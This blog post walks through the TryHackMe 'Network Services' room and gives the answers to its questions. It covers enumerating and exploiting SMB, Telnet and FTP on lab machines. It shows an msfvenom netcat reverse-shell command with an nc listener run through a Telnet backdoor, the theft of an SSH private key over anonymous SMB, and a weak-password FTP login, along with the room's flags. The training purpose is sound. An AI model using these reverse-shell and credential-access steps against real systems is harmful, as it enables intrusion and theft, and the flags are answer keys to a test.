---
layout: single
title: "Network Services - THM Walkthrough by Nisha"
date: 2024-01-09
author: Nisha McDonnell
excerpt: "Learn about, then enumerate and exploit a variety of network services and misconfigurations."
categories:
  - Blog
toc: true
toc_label: "Table of Contents"
toc_icon: "cog"
toc_depth: 3
toc_sticky: true
tags:
  - Penetration Testing
  - Ethical Hacking
  - Cybersecurity
  - Vulnerability Exploitation
tagline: "Learn about, then enumerate and exploit a variety of network services and misconfigurations."
header:
  image: /assets/images/
  caption: ""
  teaser: /assets/images/
  overlay_filter: rgba(0, 0, 0, 0.5)
  overlay_image: /assets/images/ctf_hero_header_image.png
  caption: "Photo credit: [**AI**](https://chatgpt.com/)"
  toc: true
---

## Network Services Exploitation: A Walkthrough of Enumeration and Misconfigurations" - THM 

## Table of Contents
- [Introduction](#introduction)
- [Task 1: Get Connected](#task-1-get-connected)
- [Task 2: Understanding SMB](#task-2-understanding-smb)
- [Task 3: Enumerating SMB](#task-3-enumerating-smb)
- [Task 4: Exploiting SMB](#task-4-exploiting-smb)
- [Task 5: Understanding Telnet](#task-5-understanding-telnet)
- [Task 6: Enumerating Telnet](#task-6-enumerating-telnet)
- [Task 7: Exploiting Telnet](#task-7-exploiting-telnet)
- [Task 8: Understanding FTP](#task-8-understanding-ftp)
- [Task 9: Enumerating FTP](#task-9-enumerating-ftp)
- [Task 10: Exploiting FTP](#task-10-exploiting-ftp)
- [Task 11: Expanding Your Knowledge](#task-11-expanding-your-knowledge)
- [Conclusion](#conclusion)

## Introduction
The "Network Services" room on TryHackMe offers a hands-on experience for understanding and exploiting common network services such as SMB, Telnet, and FTP. In this room, you will learn how to identify vulnerable network services and misconfigurations, which are prime targets for penetration testers. The room focuses on teaching enumeration techniques and how to exploit weaknesses within these protocols, which are often overlooked in real-world environments.

By completing this room, you will acquire essential penetration testing skills, including:

Enumerating SMB to discover shared resources and identify potential attack vectors.
Exploiting SMB vulnerabilities to gain access to sensitive data or pivot within a network.
Understanding Telnet and the risks it poses when used in insecure environments.
Enumerating Telnet services and exploiting weak configurations or default credentials.
Working with FTP to identify misconfigurations such as anonymous access and weak authentication, and how to exploit them.
The objective of this room is to equip you with the knowledge and hands-on experience to conduct network service enumeration, identify misconfigurations, and exploit vulnerabilities in SMB, Telnet, and FTP services. These techniques are fundamental to penetration testing, as they allow you to assess and secure network services commonly found in corporate environments. Through this room, you'll strengthen your skills in network scanning, vulnerability identification, and service exploitation—key competencies for any penetration tester or security professional.

## Task 1: Get Connected
Ready? Let's get going!

## Task 2: Understanding SMB

What does SMB stand for?    

- Server Message Block

What type of protocol is SMB?    

- response-request


What do clients connect to servers using?    

- TCP/IP

What systems does Samba run on?
- Unix


## Task 3: Enumerating SMB
 
Conduct an nmap scan of your choosing, How many ports are open?

- 3
 
What ports is SMB running on?

- 139/445
 
Let's get started with Enum4Linux, conduct a full basic enumeration. For starters, what is the workgroup name?    

- WORKGROUP
 
What comes up as the name of the machine?        

- POLOSMB
 
What operating system version is running?    

- 6.1
 
What share sticks out as something we might want to investigate?    

- profiles


## Task 4: Exploiting SMB

What would be the correct syntax to access an SMB share called "secret" as user "suit" on a machine with the IP 10.10.10.2 on the default port?

- smbclient //10.10.10.2/secret -U suit -p 445
 
Great! Now you've got a hang of the syntax, let's have a go at trying to exploit this vulnerability. You have a list of users, the name of the share (smb) and a suspected vulnerability.
- No answer needed
 
Lets see if our interesting share has been configured to allow anonymous access, I.E it doesn't require authentication to view the files. We can do this easily by:

- using the username "Anonymous"

- connecting to the share we found during the enumeration stage

- and not supplying a password.

Does the share allow anonymous access? Y/N?

- Y
 
Great! Have a look around for any interesting documents that could contain valuable information. Who can we assume this profile folder belongs to?
- John Cactus
 
What service has been configured to allow him to work from home?

- ssh
 
Okay! Now we know this, what directory on the share should we look in?

- .ssh
 
This directory contains authentication keys that allow a user to authenticate themselves on, and then access, a server. Which of these keys is most useful to us?

- id_rsa
 
Hint
Download this file to your local machine, and change the permissions to "600" using "chmod 600 [file]".

Now, use the information you have already gathered to work out the username of the account. Then, use the service and key to log-in to the server.

What is the smb.txt flag?
- THM{smb_is_fun_eh?}

## Task 5: Understanding Telnet
 
What is Telnet?    

- application protocol
 
What has slowly replaced Telnet?    

- ssh
 
How would you connect to a Telnet server with the IP 10.10.10.3 on port 23?
- telnet 10.10.10.3 23
 
The lack of what, means that all Telnet communication is in plaintext?

- encryption

## Task 6: Enumerating Telnet

 How many ports are open on the target machine?    

- 1
 
 
What port is this?

- 8012
 
This port is unassigned, but still lists the protocol it's using, what protocol is this?     

- tcp
 
Now re-run the nmap scan, without the -p- tag, how many ports show up as open?

- 0
 
Here, we see that by assigning telnet to a non-standard port, it is not part of the common ports list, or top 1000 ports, that nmap scans. It's important to try every angle when enumerating, as the information you gather here will inform your exploitation stage.

- No answer needed
 
Based on the title returned to us, what do we think this port could be used for?
- a backdoor
 
Who could it belong to? Gathering possible usernames is an important step in enumeration.
- Skidy
 
Always keep a note of information you find during your enumeration stage, so you can refer back to it when you move on to try exploits.

- No answer needed

## Task 7: Exploiting Telnet
 
Okay, let's try and connect to this telnet port! If you get stuck, have a look at the syntax for connecting outlined above.

- No answer needed
 
Great! It's an open telnet connection! What welcome message do we receive?

- SKIDY'S BACKDOOR.
 
 
Let's try executing some commands, do we get a return on any input we enter into the telnet session? (Y/N)

- N
 
Hmm... that's strange. Let's check to see if what we're typing is being executed as a system command.

- No answer needed
 
Start a tcpdump listener on your local machine.

If using your own machine with the OpenVPN connection, use:

sudo tcpdump ip proto \\icmp -i tun0
If using the AttackBox, use:

sudo tcpdump ip proto \\icmp -i ens5
This starts a tcpdump listener, specifically listening for ICMP traffic, which pings operate on.

- No answer needed
 
Now, use the command "ping [local THM ip] -c 1" through the telnet session to see if we're able to execute system commands. Do we receive any pings? Note, you need to preface this with .RUN (Y/N)

- Y
 
Great! This means that we are able to execute system commands AND that we are able to reach our local machine. Now let's have some fun!

- No answer needed
 
We're going to generate a reverse shell payload using msfvenom.This will generate and encode a netcat reverse shell for us. Here's our syntax:

  "msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R"

- -p = payload
- lhost = our local host IP address (this is your machine's IP address)
- lport = the port to listen on (this is the port on your machine)
- R = export the payload in raw format

What word does the generated payload start with?

- mkfifo
 
Perfect. We're nearly there. Now all we need to do is start a netcat listener on our local machine. We do this using:

"nc -lvnp [listening port]"

What would the command look like for the listening port we selected in our payload?


- nc -lvnp 4444
 
Great! Now that's running, we need to copy and paste our msfvenom payload into the telnet session and run it as a command. Hopefully- this will give us a shell on the target machine!

- No answer needed
 
Success! What is the contents of flag.txt?

THM{y0u_g0t_th3_t3ln3t_fl4g}

## Task 8: Understanding FTP
 What communications model does FTP use?

- client-server
 
 What's the standard FTP port?

- 21
 
How many modes of FTP connection are there?    
- 2


## Task 9: Enumerating FTP
 
 Run an nmap scan of your choice.

How many ports are open on the target machine? 

- 2
 
What port is ftp running on?

- 21
 
What variant of FTP is running on it?  

- vsftpd
 
Great, now we know what type of FTP server we're dealing with we can check to see if we are able to login anonymously to the FTP server. We can do this using by typing "ftp [IP]" into the console, and entering "anonymous", and no password when prompted.

What is the name of the file in the anonymous FTP directory?



- PUBLIC_NOTICE.txt
 
What do we think a possible username
could be?

- mike
 
Great! Now we've got details about the FTP server and, crucially, a possible username. Let's see what we can do with that...

- No answer needed.

## Task 10: Exploiting FTP
 What is the password for the user "mike"?

- password
 
Bingo! Now, let's connect to the FTP server as this user using "ftp [IP]" and entering the credentials when prompted

- No answer needed
 
What is ftp.txt?

- THM{y0u_g0t_th3_ftp_fl4g}


## Task 11: Expanding Your Knowledge
 Well done, you did it!

- No answer needed


## Conclusion

In this walkthrough of the "Network Services" room, we explored key network services like SMB, Telnet, and FTP, learning how to enumerate and exploit common vulnerabilities and misconfigurations. Through hands-on exercises, we developed practical skills in identifying weak points within network services and executing attacks to gain unauthorized access. By completing this room, we gained a deeper understanding of enumeration techniques, service exploitation, and the real-world implications of insecure network configurations.

Knowing how to properly enumerate and exploit network services is crucial in penetration testing. In many real-world engagements, attackers frequently target misconfigured services like SMB, Telnet, and FTP to gain a foothold in a network. Penetration testers must be able to identify these vulnerabilities and exploit them to assess the security posture of an organization. Understanding these weaknesses not only helps in offensive testing but also in defensive strategies, ensuring that systems are properly secured against common attack vectors.

I encourage you to practice these skills on your own or dive into more TryHackMe rooms to expand your knowledge. Network services and their exploitation are fundamental areas in cybersecurity, and there is always more to learn. Keep honing your skills, stay curious, and continue testing your abilities in the field of penetration testing.
